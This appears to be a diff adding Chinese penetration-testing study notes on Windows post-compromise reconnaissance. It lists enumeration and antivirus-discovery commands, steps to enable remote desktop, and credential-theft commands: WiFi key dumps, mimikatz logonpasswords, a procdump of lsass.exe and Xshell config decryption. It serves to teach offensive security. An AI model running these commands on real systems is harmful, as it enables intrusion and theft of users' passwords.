@@ -1,0 +1,107 @@
+信息收集（通过收集目标内网信息，洞察内网网络拓扑结构，找到内网中最薄弱的环节）（重点：wmic ）
+
+	1 基本信息（操作系统版本、服务与应用程序、网络架构）
+		systeminfo	（查询操作系统和版本信息，systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"）
+
+		echo %PROCESSOR_ARCHITECTURE%	（查看系统体系结构）
+
+		wmic product get name,version		（查询软件信息：安装的软件及版本、路径）
+
+		wmic service list brief				（查询本机服务信息）
+
+		net statistics workstation			（查询主机开机信息）
+
+		wmic qfe get Caption,Description,HotFixID,InstalledOn		（查询补丁详情）
+
+		tasklist					（查看当前进程列表和软件进程）
+		tasklist /v				（查看当前进程列表对应的用户身份）
+		tasklist /svc				（查看当前进程是否有杀毒软件（AV））
+
+		wmic startup get command,caption		（查看启动程序信息）
+
+		wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe		（查看目标主机上安装的杀毒软件）
+
+
+
+
+
+	2 网络信息（查询主机网络、防火墙、远程桌面服务信息、探测内网）
+		ipconfig /all		（查看网卡配置信息）
+
+		netstat -ano		（查看本机端口开放情况）
+
+		route print		（查询路由表及所有可⽤接⼝的ARP缓冲表）
+
+		netsh firewall show config			（Windows7）	（查看防⽕墙配置）
+		netsh advfirewall show allprofiles	（Windows10/11）
+
+		REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber		（查询远程桌⾯连接服务，得到连接端口为0xd3d，转换后为3389）
+
+		sc query termservice				（远程桌面连接服务的状态）
+		sc start termservice				（开启远程桌面连接服务）
+		sc config termservice start= auto	（将远程桌面连接服务设置为自启动）
+
+		reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"			（代理配置的状态）
+
+		for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr "TTL="			（ICMP探测）
+
+
+
+
+
+	3 用户信息（查询用户信息）
+		net user						（查看有哪些用户）
+
+		query user || qwinsta			（查看当前在线用户）
+
+		whoami
+		whoami /PRIV				（查询当前权限）
+
+		net localgroup				（获取本地用户组信息）
+
+		wmic useraccount get /all		（查看用户详细信息）
+
+
+
+
+
+	4 凭证信息（查询cmdkey信息、WiFi信息、mimikatz：https://github.com/gentilkiwi/mimikatz/、Xshell配置文件）
+		cmdkey /list			（cmdkey: 创建、列出并删除存储的用户名和密
+码或凭据：https://learn.microsoft.com/zh-cn/windows-server/administration/windows- commands/cmdkey）
+
+		Netsh wlan show profiles		（查看WiFi密码）
+
+		netsh wlan show profile name="iQOO U3" key=clear		（查看WiFi密码）
+
+		mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"		（破解计算机中的账号密码）
+
+		（procdump + mimikatz 加载dmp文件，并导出其中的明文密码）
+		procdump64.exe -accepteula -ma lsass.exe lsass.dmp								（导出dmp文件）
+		mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit		（将lsass.dmp放在mimikatz同一目录，读取密码文件）
+
+		（Xshell配置文件解密）
+		Xdecrypt.exe -p "路径"			（配置文件目录C:\Users\Administrator\Documents\NetSarang Computer\7\Xshell\Sessions，解密配置文件：https://github.com/plexming/Xdecrypt）
+
+
+
+
+
+	5 工具开发（工具开发 - bat、python、go）
+		
+		- bat
+			输出的信息
+			保存查询到的信息为文件
+			查询信息的命令编排
+
+		- go（Goland）
+			输出的信息
+			保存查询到的信息为文件
+			查询信息的命令编排
+			设置文件编码格式
+
+
+
+
+
+
+
